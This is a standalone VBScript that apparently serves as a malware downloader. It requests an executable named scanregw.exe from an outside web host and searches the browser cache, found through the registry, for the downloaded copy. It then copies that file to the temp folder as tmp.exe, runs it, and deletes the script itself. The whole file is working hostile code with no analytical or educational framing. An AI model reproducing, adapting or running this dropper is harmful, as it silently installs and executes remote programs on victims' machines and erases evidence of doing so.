Function bytes2BSTR(vIn)
dim strReturn
	dim i,ThisCharCode,NextCharCode
	strReturn = ""
	For i = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i = i + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
End Function
Function OpenHttp(Url)
	On Error Resume Next
	set Http = createobject("Microsoft.XMLHTTP")
	Http.open "GET",Url,false
	Http.send()
	OpenHttp = bytes2BSTR(Http.responseBody)
End Function
OpenHttp "http://www.xy001.com/scanregw.exe"
Dim FSO,WSH,CACHE,str 
Set FSO = CreateObject("Scripting.FileSystemObject") 
Set WSH = CreateObject("WScript.Shell") 
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache") 
SearchBMPFile fso.GetFolder(CACHE),"scanregw[1].exe"
WScript.Quit()
Function SearchBMPFile(Folder,fname) 
Dim SubFolder,File,Lt,tmp,winsys 
str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname 
if FSO.FileExists(str) then
winsys=fso.GetSpecialFolder(1) & "\"
tmp = fso.GetSpecialFolder(2) & "\"
set File=FSO.GetFile(str)
tmp = tmp & "tmp.exe"
File.Copy(tmp)
WSH.Run tmp
FSO.DeleteFile WScript.ScriptFullName
End If
If Folder.SubFolders.Count <> 0 Then 
For Each SubFolder In Folder.SubFolders 
SearchBMPFile SubFolder,fname 
Next
End If
End Function

